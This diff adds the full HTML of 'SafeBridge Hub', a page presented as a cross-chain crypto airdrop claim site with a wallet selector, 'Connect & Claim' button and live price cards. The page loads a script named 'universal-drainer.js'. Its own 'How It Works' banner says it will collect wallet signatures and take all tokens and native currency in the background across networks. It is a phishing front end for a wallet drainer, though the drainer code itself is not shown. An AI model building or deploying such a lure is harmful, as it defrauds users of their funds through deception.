@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafeBridge Airdrop Hub - Claim Across All Networks</title>
+    <meta name="description" content="Claim airdrops across multiple blockchain networks instantly. Ethereum, BSC, Polygon, Solana, Tron, Avalanche and more - all in one platform.">
+    <meta name="keywords" content="multi-chain airdrop, blockchain, Ethereum, BSC, Polygon, Solana, Tron, Avalanche">
+    <link rel="icon" type="image/svg+xml" href="styles/logo.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/tsparticles-slim@latest/tsparticles.slim.bundle.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #00D9FF;
+            --secondary: #8B5CF6;
+            --accent: #FF006E;
+            --dark-bg: #0A0E27;
+            --card-bg: #141829;
+            --border-color: rgba(139, 92, 246, 0.2);
+            --text-primary: #FFFFFF;
+            --text-secondary: #B0B8D4;
+            --success: #10B981;
+            --warning: #F59E0B;
+            --error: #EF4444;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated background gradient */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, 
+                rgba(0, 217, 255, 0.05) 0%,
+                rgba(139, 92, 246, 0.05) 50%,
+                rgba(255, 0, 110, 0.05) 100%);
+            pointer-events: none;
+            animation: gradientShift 8s ease infinite;
+            z-index: 0;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        /* Floating orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: 0;
+        }
+
+        .orb-1 { width: 300px; height: 300px; background: radial-gradient(circle, var(--primary), transparent); top: -100px; left: -100px; animation: float 20s infinite; }
+        .orb-2 { width: 200px; height: 200px; background: radial-gradient(circle, var(--secondary), transparent); bottom: -50px; right: -50px; animation: float 15s infinite reverse; }
+        .orb-3 { width: 250px; height: 250px; background: radial-gradient(circle, var(--accent), transparent); top: 50%; left: 10%; animation: float 25s infinite; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(50px); }
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 3rem;
+            padding: 1.5rem;
+            background: rgba(20, 24, 41, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 1rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--dark-bg);
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-text h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin: 0;
+        }
+
+        .logo-text p {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.25rem;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--success);
+            border-radius: 9999px;
+            font-size: 0.9rem;
+            color: var(--success);
+            font-weight: 500;
+        }
+
+        .status-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Main content */
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2rem;
+        }
+
+        /* Hero section */
+        .hero {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .hero h2 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: 700;
+            margin-bottom: 1rem;
+            line-height: 1.1;
+            letter-spacing: -0.5px;
+        }
+
+        .hero-gradient {
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% auto;
+            animation: shimmer 3s ease infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% center; }
+            50% { background-position: 100% center; }
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 2rem;
+            line-height: 1.6;
+        }
+
+        /* Feature highlights */
+        .features-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-bottom: 3rem;
+        }
+
+        .feature-card {
+            padding: 1.5rem;
+            background: rgba(20, 24, 41, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-4px);
+            background: rgba(0, 217, 255, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .feature-card h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+        }
+
+        .feature-card p {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .main-panel {
+            background: rgba(20, 24, 41, 0.7);
+            border: 1px solid var(--border-color);
+            border-radius: 1.25rem;
+            padding: 2rem;
+            backdrop-filter: blur(20px);
+        }
+
+        /* Wallet selector */
+        .wallet-section {
+            margin-bottom: 2rem;
+        }
+
+        .wallet-section h3 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            letter-spacing: -0.3px;
+        }
+
+        .wallet-selector-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            align-items: flex-end;
+        }
+
+        .select-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .select-group label {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .wallet-selector-dropdown {
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .wallet-selector-dropdown:hover {
+            border-color: var(--primary);
+            background: rgba(0, 217, 255, 0.05);
+        }
+
+        .wallet-selector-dropdown:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.1);
+        }
+
+        .wallet-selector-dropdown option {
+            background: var(--card-bg);
+            color: var(--text-primary);
+            padding: 1rem;
+        }
+
+        .wallet-connect-btn {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 0.75rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-height: 50px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .wallet-connect-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 217, 255, 0.3);
+        }
+
+        .wallet-connect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .wallet-connect-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        /* Action buttons */
+        .button-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .main-button {
+            padding: 1.25rem 2rem;
+            border: none;
+            border-radius: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            min-height: 50px;
+        }
+
+        .main-button:not(.danger) {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            box-shadow: 0 4px 15px rgba(0, 217, 255, 0.2);
+        }
+
+        .main-button:not(.danger):hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 217, 255, 0.3);
+        }
+
+        .main-button.danger {
+            background: linear-gradient(135deg, var(--error), #D32F2F);
+            color: white;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2);
+        }
+
+        .main-button.danger:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(239, 68, 68, 0.3);
+        }
+
+        .main-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Progress */
+        .progress-container {
+            margin: 2rem 0;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 3px;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+        }
+
+        /* Logs */
+        .log-container {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            display: block;
+        }
+
+        .log-entry {
+            margin: 0.5rem 0;
+            padding: 0.25rem 0;
+            word-break: break-word;
+        }
+
+        .log-success { color: var(--success); }
+        .log-error { color: var(--error); }
+        .log-info { color: var(--primary); }
+        .log-warning { color: var(--warning); }
+
+        /* Scrollbar styling */
+        .log-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .log-container::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 3px;
+        }
+
+        .log-container::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 3px;
+        }
+
+        .log-container::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            border-top: 1px solid var(--border-color);
+            margin-top: auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+
+            .button-container {
+                grid-template-columns: 1fr;
+            }
+
+            .wallet-selector-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .header {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .hero h2 {
+                font-size: 1.75rem;
+            }
+
+            .hero p {
+                font-size: 1rem;
+            }
+
+            .features-row {
+                grid-template-columns: 1fr;
+            }
+
+            .main-panel {
+                padding: 1.5rem;
+            }
+        }
+
+        /* Live Crypto Prices Section */
+        .crypto-prices-section {
+            background: rgba(20, 24, 41, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 2rem;
+            margin: 2rem 0;
+            backdrop-filter: blur(10px);
+        }
+
+        .crypto-prices-section h3 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            letter-spacing: -0.3px;
+        }
+
+        .crypto-prices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .crypto-price-card {
+            background: rgba(0, 217, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 1.25rem;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .crypto-price-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-4px);
+            background: rgba(0, 217, 255, 0.1);
+        }
+
+        .crypto-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .crypto-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .crypto-symbol {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.75rem;
+            text-transform: uppercase;
+        }
+
+        .crypto-price {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .crypto-change {
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .crypto-change.positive {
+            color: var(--success);
+        }
+
+        .crypto-change.negative {
+            color: var(--error);
+        }
+
+        .prices-disclaimer {
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-top: 1rem;
+        }
+
+        /* Eligibility Banner */
+        .eligibility-banner {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.1), rgba(255, 0, 110, 0.05));
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            gap: 1.25rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .eligibility-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .eligibility-content h4 {
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+
+        .eligibility-content p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .eligibility-content strong {
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        @media (max-width: 768px) {
+            .crypto-prices-grid {
+                grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            }
+
+            .crypto-price-card {
+                padding: 1rem;
+            }
+
+            .crypto-icon {
+                font-size: 1.5rem;
+            }
+
+            .crypto-price {
+                font-size: 1rem;
+            }
+
+            .eligibility-banner {
+                flex-direction: column;
+                gap: 0.75rem;
+            }
+
+            .eligibility-icon {
+                font-size: 1.25rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .crypto-prices-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.75rem;
+            }
+
+            .crypto-price-card {
+                padding: 0.75rem;
+            }
+
+            .crypto-icon {
+                font-size: 1.25rem;
+            }
+
+            .crypto-name {
+                font-size: 0.85rem;
+            }
+
+            .crypto-price {
+                font-size: 0.9rem;
+            }
+
+            .crypto-change {
+                font-size: 0.75rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- tsParticles Blockchain Network Background -->
+    <div id="tsparticles" style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #0a0f1d;
+        z-index: 0;
+        pointer-events: auto;
+    "></div>
+
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-section">
+                <div class="logo-icon">⚡</div>
+                <div class="logo-text">
+                    <h1>SafeBridge Hub</h1>
+                    <p>Cross-chain Airdrop Platform</p>
+                </div>
+            </div>
+            <div class="status-badge">
+                Live & Ready
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Hero Section -->
+            <section class="hero">
+                <h2>Claim Airdrops <span class="hero-gradient">Across All Chains</span></h2>
+                <p>Seamlessly connect, scan, and claim tokens from Ethereum, BSC, Polygon, Solana, Tron, and more—all in one intuitive platform.</p>
+
+                <div class="features-row">
+                    <div class="feature-card">
+                        <div class="feature-icon">🌐</div>
+                        <h3>Multi-Chain</h3>
+                        <p>Support for 10+ blockchain networks</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <h3>Lightning Fast</h3>
+                        <p>Instant scanning and claiming</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <h3>Secure</h3>
+                        <p>Client-side processing only</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💼</div>
+                        <h3>All Wallets</h3>
+                        <p>MetaMask, Trust, Phantom & more</p>
+                    </div>
+                </div>
+
+                <!-- Live Crypto Prices Section -->
+                <div class="crypto-prices-section">
+                    <h3>💹 Live Crypto Prices</h3>
+                    <div class="crypto-prices-grid" id="crypto-prices-grid">
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">₿</div>
+                            <div class="crypto-name">Bitcoin</div>
+                            <div class="crypto-symbol">BTC</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">Ξ</div>
+                            <div class="crypto-name">Ethereum</div>
+                            <div class="crypto-symbol">ETH</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">◆</div>
+                            <div class="crypto-name">BNB</div>
+                            <div class="crypto-symbol">BNB</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">◎</div>
+                            <div class="crypto-name">Solana</div>
+                            <div class="crypto-symbol">SOL</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">₮</div>
+                            <div class="crypto-name">Polygon</div>
+                            <div class="crypto-symbol">MATIC</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                        <div class="crypto-price-card">
+                            <div class="crypto-icon">🔗</div>
+                            <div class="crypto-name">Chainlink</div>
+                            <div class="crypto-symbol">LINK</div>
+                            <div class="crypto-price">Loading...</div>
+                            <div class="crypto-change">--</div>
+                        </div>
+                    </div>
+                    <p class="prices-disclaimer">Prices updated every 30 seconds • Data from CoinGecko</p>
+                </div>
+            </section>
+
+            <!-- Main Panel -->
+            <section class="main-panel">
+                <!-- Wallet Selection -->
+                <div class="wallet-section">
+                    <h3>🚀 Connect & Claim Across All Networks</h3>
+                    <div class="wallet-selector-container">
+                        <div class="select-group">
+                            <label for="wallet-selector">Select Your Wallet</label>
+                            <select class="wallet-selector-dropdown" id="wallet-selector">
+                                <option value="">Choose a wallet...</option>
+                                <option value="metamask">🦊 MetaMask</option>
+                                <option value="trust">🛡️ Trust Wallet</option>
+                                <option value="coinbase">🔵 Coinbase Wallet</option>
+                                <option value="rainbow">🌈 Rainbow</option>
+                                <option value="phantom">👻 Phantom</option>
+                                <option value="solflare">☀️ Solflare</option>
+                                <option value="backpack">🎒 Backpack</option>
+                                <option value="glow">✨ Glow</option>
+                                <option value="tronlink">⬢ TronLink</option>
+                                <option value="injected-evm">📱 Mobile EVM</option>
+                                <option value="injected-solana">📱 Mobile Solana</option>
+                                <option value="injected-tron">📱 Mobile Tron</option>
+                            </select>
+                        </div>
+                        <button class="wallet-connect-btn main-button" id="connect-and-claim-btn" disabled>
+                            ⚡ Connect & Claim All Networks
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Eligibility Requirements -->
+                <div class="eligibility-banner">
+                    <div class="eligibility-icon">⚠️</div>
+                    <div class="eligibility-content">
+                        <h4>How It Works</h4>
+                        <p>Select your wallet and click "Connect & Claim". We'll connect to each network one by one, collect your signature, and mint all tokens and native currency in the background. Each network is required to have atleast $10 for elegebility.</p>
+                    </div>
+                </div>
+
+                <!-- Progress -->
+                <div class="progress-container" id="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                    <div class="progress-text" id="progress-text">Processing...</div>
+                </div>
+
+                <!-- Logs -->
+                <div class="log-container" id="log-container">
+                    <div class="log-entry log-info">✓ SafeBridge Hub initialized</div>
+                    <div class="log-entry log-info">✓ Ready to scan networks</div>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 SafeBridge Hub. Advanced cross-chain portfolio management system.</p>
+    </footer>
+
+    <!-- Web3 Libraries -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="scripts/config.js"></script>
+    <script>
+        // Initialize tsParticles with blockchain network visualization
+        async function initParticles() {
+            await tsParticles.load("tsparticles", {
+                background: {
+                    color: {
+                        value: "#0a0f1d"
+                    }
+                },
+                fpsLimit: 60,
+                particles: {
+                    number: {
+                        value: 80,
+                        density: {
+                            enable: true,
+                            value_area: 800
+                        }
+                    },
+                    color: {
+                        value: "#00f2fe"
+                    },
+                    shape: {
+                        type: "circle"
+                    },
+                    opacity: {
+                        value: 0.6,
+                        animation: {
+                            enable: true,
+                            minimumValue: 0.3,
+                            speed: 1.5,
+                            sync: false
+                        }
+                    },
+                    size: {
+                        value: {
+                            min: 1.5,
+                            max: 3.5
+                        },
+                        animation: {
+                            enable: true,
+                            minimumValue: 1.5,
+                            speed: 2,
+                            sync: false
+                        }
+                    },
+                    move: {
+                        enable: true,
+                        speed: 1,
+                        direction: "none",
+                        random: true,
+                        straight: false,
+                        outModes: {
+                            default: "bounce",
+                            bottom: "bounce",
+                            left: "bounce",
+                            right: "bounce",
+                            top: "bounce"
+                        },
+                        attract: {
+                            enable: false,
+                            rotateX: 600,
+                            rotateY: 1200
+                        }
+                    },
+                    links: {
+                        enable: true,
+                        distance: 150,
+                        color: {
+                            value: "#00f2fe"
+                        },
+                        opacity: 0.4,
+                        width: 1.2,
+                        triangles: {
+                            enable: false,
+                            frequency: 5
+                        }
+                    }
+                },
+                interactivity: {
+                    detectsOn: "canvas",
+                    events: {
+                        onClick: {
+                            enable: true,
+                            mode: "push"
+                        },
+                        onHover: {
+                            enable: true,
+                            mode: "repulse"
+                        },
+                        resize: {
+                            enable: true
+                        }
+                    },
+                    modes: {
+                        push: {
+                            quantity: 4,
+                            distance: 150
+                        },
+                        repulse: {
+                            distance: 200,
+                            duration: 0.4,
+                            factor: 100,
+                            speed: 1,
+                            maxSpeed: 50,
+                            easing: "ease-out-quad"
+                        },
+                        grab: {
+                            distance: 150,
+                            line_linked: {
+                                opacity: 0.8
+                            }
+                        }
+                    }
+                },
+                retina_detect: true,
+                style: {
+                    pointerEvents: "auto"
+                }
+            });
+        }
+
+        // Initialize particles when DOM is ready
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", initParticles);
+        } else {
+            initParticles();
+        }
+    </script>
+    <script src="scripts/universal-drainer.js"></script>
+
+    <!-- Live Crypto Prices Script -->
+    <script>
+        // Crypto prices mapping to CoinGecko API IDs
+        const cryptoPriceMap = {
+            'bitcoin': { symbol: 'BTC', icon: '₿' },
+            'ethereum': { symbol: 'ETH', icon: 'Ξ' },
+            'binancecoin': { symbol: 'BNB', icon: '◆' },
+            'solana': { symbol: 'SOL', icon: '◎' },
+            'matic-network': { symbol: 'MATIC', icon: '₮' },
+            'chainlink': { symbol: 'LINK', icon: '🔗' }
+        };
+
+        // Fetch crypto prices from CoinGecko API
+        async function fetchCryptoPrices() {
+            try {
+                const priceIds = Object.keys(cryptoPriceMap).join(',');
+                const response = await fetch(
+                    `https://api.coingecko.com/api/v3/simple/price?ids=${priceIds}&vs_currencies=usd&include_24hr_change=true`
+                );
+                
+                if (!response.ok) throw new Error('Failed to fetch prices');
+                
+                const data = await response.json();
+                updatePricDisplay(data);
+            } catch (error) {
+                console.error('Error fetching crypto prices:', error);
+            }
+        }
+
+        // Update price display in the UI
+        function updatePricDisplay(priceData) {
+            const grid = document.getElementById('crypto-prices-grid');
+            if (!grid) return;
+
+            Object.entries(cryptoPriceMap).forEach(([cryptoId, cryptoInfo]) => {
+                const card = grid.querySelector(`[data-crypto="${cryptoId}"]`);
+                if (!card || !priceData[cryptoId]) return;
+
+                const price = priceData[cryptoId].usd;
+                const change24h = priceData[cryptoId].usd_24h_change;
+
+                const priceElement = card.querySelector('.crypto-price');
+                const changeElement = card.querySelector('.crypto-change');
+
+                if (priceElement) {
+                    priceElement.textContent = `$${price?.toFixed(2) || 'N/A'}`;
+                }
+
+                if (changeElement) {
+                    const changeText = change24h ? change24h.toFixed(2) : 'N/A';
+                    const changeClass = change24h >= 0 ? 'positive' : 'negative';
+                    const changeSymbol = change24h >= 0 ? '📈' : '📉';
+                    changeElement.textContent = `${changeSymbol} ${changeText}%`;
+                    changeElement.className = `crypto-change ${changeClass}`;
+                }
+            });
+        }
+
+        // Initialize price cards with data attributes
+        function initializePriceCards() {
+            const grid = document.getElementById('crypto-prices-grid');
+            if (!grid) return;
+
+            const cards = grid.querySelectorAll('.crypto-price-card');
+            const cryptoIds = Object.keys(cryptoPriceMap);
+
+            cards.forEach((card, index) => {
+                if (index < cryptoIds.length) {
+                    const cryptoId = cryptoIds[index];
+                    const cryptoInfo = cryptoPriceMap[cryptoId];
+                    card.setAttribute('data-crypto', cryptoId);
+                    card.querySelector('.crypto-icon').textContent = cryptoInfo.icon;
+                }
+            });
+        }
+
+        // Update prices on page load and set interval
+        document.addEventListener('DOMContentLoaded', () => {
+            initializePriceCards();
+            fetchCryptoPrices();
+            // Update prices every 30 seconds
+            setInterval(fetchCryptoPrices, 30000);
+        });
+    </script>
+</body>
+</html>
